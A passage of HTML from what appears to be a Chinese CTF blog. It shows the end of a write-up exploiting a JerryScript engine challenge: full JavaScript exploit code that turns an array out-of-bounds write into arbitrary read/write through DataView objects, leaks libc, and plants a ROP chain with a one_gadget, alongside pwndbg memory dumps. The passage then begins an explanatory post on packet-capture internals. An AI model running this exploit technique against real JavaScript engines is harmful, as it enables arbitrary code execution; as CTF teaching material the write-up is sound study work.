class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>);&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aar</span>(<span class="params">addr, dv1, dv2</span>)</span>&#123;</span><br><span class="line">    dv1.setBigUint64(<span class="number">0</span>, addr, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(dv2.buffer)&#123;</span><br><span class="line">        <span class="keyword">return</span> dv2.getBigUint64(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaw</span>(<span class="params">addr, value, dv1, dv2</span>)</span>&#123;</span><br><span class="line">    dv1.setBigUint64(<span class="number">0</span>, addr, <span class="literal">true</span>);</span><br><span class="line">    dv2.setBigUint64(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">0x31</span>];</span><br><span class="line">a1 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">d1 = <span class="keyword">new</span> <span class="built_in">DataView</span>(a1);</span><br><span class="line">d1.setUint32(<span class="number">0</span>, <span class="number">0x41414141</span>, <span class="literal">true</span>);</span><br><span class="line">a2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">d2 = <span class="keyword">new</span> <span class="built_in">DataView</span>(a2);</span><br><span class="line">d2.setUint32(<span class="number">0</span>, <span class="number">0x42424242</span>, <span class="literal">true</span>);</span><br><span class="line">a.pop();</span><br><span class="line">a[<span class="number">0x2c</span>] = <span class="number">0x5562526</span>;</span><br><span class="line">puts_got            = <span class="built_in">Number</span>(aar(<span class="number">0x555555621e08</span>, d1, d2));</span><br><span class="line">libc_base           = puts_got - <span class="number">0x84420</span>;</span><br><span class="line">environ             = libc_base + <span class="number">0x1ef600</span>;</span><br><span class="line">stack               = <span class="built_in">Number</span>(aar(environ, d1, d2));</span><br><span class="line">libc_start_main_ret = stack - <span class="number">0x108</span>;</span><br><span class="line">libc_start_main     = <span class="built_in">Number</span>(aar(libc_start_main_ret, d1, d2));</span><br><span class="line">aaw(libc_start_main_ret, <span class="number">0x555555554000</span> + <span class="number">0xa9a9</span>, d1, d2);  <span class="comment">// pop r12, rbp</span></span><br><span class="line">aaw(libc_start_main_ret + <span class="number">8</span>, <span class="number">0</span>, d1, d2);</span><br><span class="line">aaw(libc_start_main_ret + <span class="number">16</span>, <span class="number">0</span>, d1, d2);</span><br><span class="line">aaw(libc_start_main_ret + <span class="number">24</span>, libc_base + <span class="number">0xe3afe</span>, d1, d2);  <span class="comment">// one_gadget</span></span><br><span class="line">print(hex(puts_got));</span><br><span class="line">print(hex(libc_base));</span><br><span class="line">print(hex(stack));</span><br><span class="line">print(hex(libc_start_main));</span><br><span class="line">print(hex(<span class="built_in">Number</span>(aar(<span class="number">0x555555624000</span>, d1, d2))));</span><br></pre></td></tr></table></figure>
<ul>
<li>因为这些函数和变量都会改变堆布局，所以我直接调试 exp</li>
</ul>
<p>在 <code>ecma_builtin_array_prototype_object_pop</code>（710ab）打断点，然后使用 <code>p/x $rdi+0x10</code> 命令就可以把发生 OOB 的数组 <code>a</code> 给打印出来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x $rdi+<span class="number">0x10</span></span><br><span class="line">$<span class="number">1</span> = <span class="number">0x555555624f80</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x555555624f80</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x555555624f70</span>:	<span class="number">0x005e0064005e0014</span>	<span class="number">0x000000ecffffffff</span> <span class="comment">/* length */</span></span><br><span class="line"><span class="number">0x555555624f80</span>:	<span class="number">0x0025000000c80038</span>	<span class="number">0x0000000100200004</span></span><br><span class="line"><span class="number">0x555555624f90</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x42d5555558878200</span></span><br><span class="line"><span class="number">0x555555624fa0</span>:	<span class="number">0x0025006e00620018</span>	<span class="number">0x0000000100000012</span></span><br><span class="line"><span class="number">0x555555624fb0</span>:	<span class="number">0x000003c300587d37</span>	<span class="number">0x012f007200000343</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>property_list_cp</code> 和 <code>prototype_cp</code> 的值分为 <code>0x64</code> 和 <code>0x5e</code> </li>
</ul>
<p>然后在 <code>jerryx_print_value</code>（a5ae2）打断点，执行到 <code>print(a.length)</code> 前停下，打印两个 DataView 对象的位置：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -s AAAA</span><br><span class="line">[heap]          <span class="number">0x5555556257b0</span> <span class="number">0x41414141</span> <span class="comment">/* &#x27;AAAA&#x27; */</span></span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x5555556257b0</span></span><br><span class="line">[heap]          <span class="number">0x555555625030</span> <span class="number">0x5555556257b0</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; search -s BBBB</span><br><span class="line">[heap]          <span class="number">0x5555556267b0</span> <span class="number">0x42424242</span> <span class="comment">/* &#x27;BBBB&#x27; */</span></span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x5555556267b0</span></span><br><span class="line">[heap]          <span class="number">0x555555625260</span> <span class="number">0x5555556267b0</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>a1-&gt;buffer_p(0x5555556257b0)：AAAA</code></li>
<li><code>d1-&gt;buffer_p(0x555555625030)：0x5555556257b0</code></li>
<li><code>a2-&gt;buffer_p(0x5555556267b0)：BBBB</code></li>
<li><code>d2-&gt;buffer_p(0x555555625260)：0x5555556267b0</code></li>
</ul>
<p>如果我们想利用 <code>a</code> 的溢出点，必须先知道 <code>jerry_global_heap</code> 才能计算 <code>property_list_cp</code> ，而源程序没有符号表，我们只能通过对比源程序和我们自己编译的程序来获取这个值：（不知道的偏移都可以利用这个方法来解决）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55555566a000</span>+<span class="number">0x17b0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555566b7b0</span> (jerry_global_heap+<span class="number">2896</span>) ◂— <span class="number">0x42424152</span> <span class="comment">/* &#x27;RABB&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555566b7b8</span> (jerry_global_heap+<span class="number">2904</span>) ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x55555566b7b0</span><span class="number">-2896</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555566ac60</span> (jerry_global_heap) ◂— <span class="number">0x8e8</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555566ac68</span> (jerry_global_heap+<span class="number">8</span>) ◂— <span class="number">0x20010800be0031</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55555566ac70</span> (jerry_global_heap+<span class="number">16</span>) ◂— <span class="number">0x100000066</span> <span class="comment">/* &#x27;f&#x27; */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555624000</span>+<span class="number">0x17b0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5555556257b0</span> ◂— <span class="number">0x41414141</span> <span class="comment">/* &#x27;AAAA&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5555556257b8</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555556257b0</span><span class="number">-2896</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555624c60</span> ◂— <span class="number">0x658</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x555555624c68</span> ◂— <span class="number">0x2000d500be0031</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x555555624c70</span> ◂— <span class="number">0x100000066</span> <span class="comment">/* &#x27;f&#x27; */</span></span><br></pre></td></tr></table></figure>
<p>根据公式 <code>jerry_globals_heap + array-&gt;u1.property_list_cp &lt;&lt; 3</code> 进行计算：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">25</span>]: hex(<span class="number">0x555555624c60</span>+(<span class="number">0x64</span>&lt;&lt;<span class="number">3</span>))</span><br><span class="line">Out[<span class="number">25</span>]: <span class="string">&#x27;0x555555624f80&#x27;</span></span><br></pre></td></tr></table></figure>
<p>修改前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555624f80</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555624f80</span> ◂— <span class="number">0x8800000310</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x555555624f88</span> ◂— <span class="number">0x8800000088</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x555555624fa0</span> ◂— <span class="number">0x25006e00620018</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x555555624fa8</span> ◂— <span class="number">0x100000012</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x555555624fb0</span> ◂— <span class="number">0x3c300587d37</span> <span class="comment">/* &#x27;7&#125;X&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x555555624fb8</span> ◂— <span class="number">0x12f007200000343</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x555555624fc0</span> ◂— <span class="number">0x20000000680011</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x555555624fc8</span> ◂— <span class="number">0x100000040</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x555555624fd0</span> ◂— <span class="number">0x10000078c8</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x555555624fd8</span> ◂— <span class="number">0x10a01a900000363</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x555555624fe0</span> ◂— <span class="number">0xe40c292c0000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x555555624fe8</span> ◂— <span class="number">0x605040477616100</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x555555624ff0</span> ◂— <span class="number">0x1c24b8a70000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x555555624ff8</span> ◂— <span class="number">0x100f0e0e0d316101</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x555555625000</span> ◂— <span class="number">0x881d13e60000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x555555625008</span> ◂— <span class="number">0x1c1b1a1a19316401</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x555555625010</span> ◂— <span class="number">0xb400b20074008b</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x555555625018</span> ◂— <span class="number">0xd300d000cd0076</span> <span class="comment">/* &#x27;v&#x27; */</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0x555555625020</span> ◂— <span class="number">0x6c0000006c0012</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0x555555625028</span> ◂— <span class="number">0x100000000319</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0x555555625030</span> —▸ <span class="number">0x5555556257b0</span> ◂— <span class="number">0x41414141</span> <span class="comment">/* &#x27;AAAA&#x27; */</span></span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x555555625038</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>修改后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555624f80</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555624f80</span> ◂— <span class="number">0x25000000c80018</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x555555624f88</span> ◂— <span class="number">0x100200004</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x555555624f90</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x555555624f98</span> —▸ <span class="number">0x5555556253b8</span> —▸ <span class="number">0x555555625168</span> —▸ <span class="number">0x5555556253b0</span> —▸ <span class="number">0x5555556253c0</span> ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x555555624fa0</span> ◂— <span class="number">0x25006e00620018</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x555555624fa8</span> ◂— <span class="number">0x100000012</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x555555624fb0</span> ◂— <span class="number">0x3c300587d37</span> <span class="comment">/* &#x27;7&#125;X&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x555555624fb8</span> ◂— <span class="number">0x12f007200000343</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x555555624fc0</span> ◂— <span class="number">0x20000000680011</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x555555624fc8</span> ◂— <span class="number">0x100000040</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x555555624fd0</span> ◂— <span class="number">0x10000078c8</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x555555624fd8</span> ◂— <span class="number">0x10a01a900000363</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x555555624fe0</span> ◂— <span class="number">0xe40c292c0000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x555555624fe8</span> ◂— <span class="number">0x605040477616100</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x555555624ff0</span> ◂— <span class="number">0x1c24b8a70000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x555555624ff8</span> ◂— <span class="number">0x100f0e0e0d316101</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x555555625000</span> ◂— <span class="number">0x881d13e60000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x555555625008</span> ◂— <span class="number">0x1c1b1a1a19316401</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x555555625010</span> ◂— <span class="number">0xb400b20074008b</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x555555625018</span> ◂— <span class="number">0xd300d000cd0076</span> <span class="comment">/* &#x27;v&#x27; */</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0x555555625020</span> ◂— <span class="number">0x6c0000006c0012</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0x555555625028</span> ◂— <span class="number">0x100000000319</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0x555555625030</span> —▸ <span class="number">0x555555625260</span> —▸ <span class="number">0x7fffffffde60</span> —▸ <span class="number">0x7ffff7ea2afe</span> (execvpe+<span class="number">638</span>) ◂— mov    rdx, r12</span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x555555625038</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>这个 <code>a[0x2c]</code> 对应的地址就是 <code>0x555555625030</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555624f80</span>+<span class="number">0x4</span>*<span class="number">0x2c</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555625030</span> —▸ <span class="number">0x555555625260</span> —▸ <span class="number">0x7fffffffde60</span> —▸ <span class="number">0x7ffff7ea2afe</span> (execvpe+<span class="number">638</span>) ◂— mov    rdx, r12</span><br></pre></td></tr></table></figure>
<ul>
<li><code>0x5555556257b0</code>（<code>a1-&gt;buffer_p</code>）被修改为了 <code>0x555555625260</code>（<code>d2-&gt;buffer_p</code>）</li>
<li>这下 <code>a1-&gt;buffer_p</code> 和 <code>a2-&gt;buffer_p</code> 都指向 <code>d2-&gt;buffer_p</code>，就可以实现 WAA 和 RAA 了</li>
</ul>
<p>最后的问题就是 WAA 和 RAA 的实现：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aar</span>(<span class="params">addr, dv1, dv2</span>)</span>&#123;</span><br><span class="line">    dv1.setBigUint64(<span class="number">0</span>, addr, <span class="literal">true</span>); <span class="comment">/* 先写入一个地址 */</span></span><br><span class="line">    <span class="keyword">if</span>(dv2.buffer)&#123;</span><br><span class="line">        <span class="keyword">return</span> dv2.getBigUint64(<span class="number">0</span>, <span class="literal">true</span>); <span class="comment">/* 返回该地址中的数据 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaw</span>(<span class="params">addr, value, dv1, dv2</span>)</span>&#123;</span><br><span class="line">    dv1.setBigUint64(<span class="number">0</span>, addr, <span class="literal">true</span>); <span class="comment">/* 先写入一个地址 */</span></span><br><span class="line">    dv2.setBigUint64(<span class="number">0</span>, value, <span class="literal">true</span>); <span class="comment">/* 再向这个地址中写入数据 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后就是用 WWR 从 <code>environ</code> 中读出栈地址，然后在 <code>libc_start_main</code> 的返回值上构造 ROP 链，最后执行 one_gadget</p>
<p>PS：在交互时需要把 <code>\n</code> 去掉，还有注释也要去掉 </p>
<p><strong>小结：</strong></p>
<p>调了好多天终于弄好了，现在对这种 JavaScript 引擎的题目应该是有所了解了，主要就是靠 ArrayBuffer 和 DataView 这两个函数</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">网络相关知识：网络抓包原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-19 10:51:24" itemprop="dateCreated datePublished" datetime="2022-08-19T10:51:24+08:00">2022-08-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-21 19:24:58" itemprop="dateModified" datetime="2022-10-21T19:24:58+08:00">2022-10-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="手机-App-抓包"><a href="#手机-App-抓包" class="headerlink" title="手机 App 抓包"></a>手机 App 抓包</h2><p>要实现对 App 的网络数据抓包，需要监控 App 与服务器交互之间的网络节点，监控其中任意一个网络节点（网卡），获取所有经过网卡中的数据，对这些数据按照网络协议进行解析，这就是抓包的基本原理</p>
<p>但是中间网络节点，不受我们控制，所以基本无法实现抓包的，只能在客户端和服务端进行抓包</p>
<p>通常我们监控本地网卡数据，如下图： </p>
<img src="/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/1660838000697-1666351497464.png" class width="1660838000697"> 
<p><code>本地网络</code> 指的是WIFI的路由，如果直接抓路由器的包还是比较麻烦的，因此我们会在 <code>手机</code> 和 <code>本地路由</code> 之间加一层 <code>代理服务</code>，这样只要抓代理服务的网络数据即可：</p>
<img src="/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/1660838017257-1666351497464.png" class width="1660838017257"> 
<h2 id="Linux-抓包"><a href="#Linux-抓包" class="headerlink" title="Linux 抓包"></a>Linux 抓包</h2><p>Linux 抓包是通过 <strong>注册一种虚拟的底层网络协议</strong> 来完成对网络报文（准确的说是网络设备）消息的处理权</p>
<ul>
<li>当网卡接收到一个网络报文之后，它会遍历系统中所有已经注册的网络协议（例如，以太网协议，x25协议处理模块）来尝试进行报文的解析处理（这一点和一些文件系统的挂载相似，就是让系统中所有的已经注册的文件系统来进行尝试挂载，如果哪一个认为自己可以处理，那么就完成挂载）</li>
<li>当抓包模块把自己伪装成一个网络协议的时候，系统在收到报文的时候就会给这个伪协议一次机会，让它来对网卡收到的报文进行一次处理，此时该模块就会趁机对报文进行窥探，也就是把这个报文完完整整的复制一份，假装是自己接收到的报文，汇报给抓包模块 </li>
</ul>
<p>具体是使用 libpcap 获取被监听网络接口的数据 </p>
<p>在 Linux 内核中，使用网络过滤器的数据包捕获是通过附加钩子来完成的：</p>
<ul>
<li>可以根据需要在路径中的不同位置指定钩子，后跟内核网络数据包</li>
<li>可以在此处找到组织结构图，其中包含路线后跟包裹以及钩子的可能区域</li>
</ul>
<p>钩子 hook 是通过以下结构定义的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">nf_hookfn</span><span class="params">(<span class="keyword">void</span> *priv,</span></span></span><br><span class="line"><span class="params"><span class="function">			       struct sk_buff *skb,</span></span></span><br><span class="line"><span class="params"><span class="function">			       <span class="keyword">const</span> struct nf_hook_state *state)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_hook_ops</span> &#123;</span></span><br><span class="line">      nf_hookfn               *hook; <span class="comment">/* 捕获网络数据包(作为结构发送的数据包)时,调用的处理程序(该字段是传递给处理程序的私有信息) */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">net_device</span>       *<span class="title">dev</span>;</span> <span class="comment">/* 要捕获的设备(网络接口) */</span></span><br><span class="line">      <span class="keyword">void</span>                    *priv; </span><br><span class="line">      <span class="keyword">u_int8_t</span>                pf; <span class="comment">/* 包装类型(PF_INET等) */</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span>            hooknum; <span class="comment">/* hook编号 */</span></span><br><span class="line">      <span class="keyword">int</span>                     priority; <span class="comment">/* 优先级 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>钩子函数 hook 的签名中有一个 <code>nf_hook_state</code> 结构体，用于描述 hook 的状态信息，关键条目如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_hook_state</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> hook;	   <span class="comment">/* hook编号 */</span></span><br><span class="line">	<span class="keyword">u_int8_t</span> pf; 		  <span class="comment">/* 包装类型 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net_device</span> *<span class="title">in</span>;</span> <span class="comment">/* 输入接口 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net_device</span> *<span class="title">out</span>;</span> <span class="comment">/* 输出接口 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span> <span class="comment">/* 对应的sock(INET套接字) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span>;</span>  <span class="comment">/* 对应的net(内核网络命名空间) */</span></span><br><span class="line">	<span class="keyword">int</span> 